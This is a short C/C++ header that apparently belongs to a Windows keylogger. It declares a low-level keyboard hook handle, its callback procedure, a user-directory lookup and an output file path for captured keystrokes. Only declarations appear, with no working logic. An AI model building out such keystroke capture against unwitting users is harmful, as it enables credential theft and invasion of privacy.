#pragma once

// Change output file path here:
wchar_t kbtestfile[100];

HHOOK kbhook;                                             // handle to keyboard hooking procedure

LRESULT CALLBACK LowLevelKeyboardProc(INT, WPARAM, LPARAM);
void GetUserDirectory(void);
